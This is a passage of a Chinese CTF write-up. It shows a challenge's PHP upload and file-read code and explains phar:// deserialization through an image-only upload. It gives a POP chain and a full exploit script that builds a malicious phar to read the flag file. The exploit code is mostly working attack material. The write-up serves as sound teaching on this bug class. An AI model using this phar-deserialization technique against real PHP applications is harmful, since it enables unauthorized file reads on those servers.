invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#upload.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//show_source(__FILE__);</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>;<span class="hljs-comment">#没什么用最后只是调用了upload_file方法。</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777);</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">upload_file_check</span>()) &#123;<br>        <span class="hljs-title function_ invoke__">upload_file_do</span>();<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>;<br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>);<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) &#123;<br>        <span class="hljs-comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>快速介绍下：先上传文件在通过phar协议即可拿到flag，upload.php上传的文件(白名单)会经过修改名字，上传到upload的目录，平且后缀只为.jpg（文件名的话可以访问upload就可以现实文件名，文件名也可以自己算出来没懂为如何算），然后在file.php中用phar协议读取上传文件，关键在于如何在class.php构造pop链</p><p>快速接受pop链如何构成：</p><p>Test：：file_get()&lt;–Test：：get()&lt;–Test：：__get()&lt;–Show：：<code>__toString()</code>&lt;–C1e4r：：<code>__destruct()</code></p><h5 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h5><p>没想到phar协议可以解析.jpg后缀说明，phar不是通过后缀判断，可能是通过内容</p><p>完整exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;       <span class="hljs-comment">//  3  赋值为Show类对象</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;        <span class="hljs-comment">//  2 str中的键名str赋值为Test类对象</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;     <span class="hljs-comment">// 1  赋值为[&#x27;source&#x27; =&gt; &#x27;/var/www/html/f1ag.php&#x27;]</span><br>&#125;<br> <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>;<br><span class="hljs-variable">$a</span>-&gt;params=[<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;/var/www/html/f1ag.php&#x27;</span>];<br><span class="hljs-comment">//如果直接赋值为f1ag.php没有作用</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$a</span>;<br><span class="hljs-comment">//也可以$b-&gt;str=[&#x27;str&#x27;=&gt;$a];</span><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>;<br><span class="hljs-variable">$c</span>-&gt;str=<span class="hljs-variable">$b</span>;<br><br><span class="hljs-keyword">or</span><br>    <br><span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$m</span>-&gt;str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$m</span>-&gt;str-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$m</span>-&gt;str-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;params[<span class="hljs-string">&quot;source&quot;</span>]=<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;<br> <br><span class="hljs-comment">//前面是构造的序列化字符串,后面是生成phar文件</span><br> <br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar,前面名称随意</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$c</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
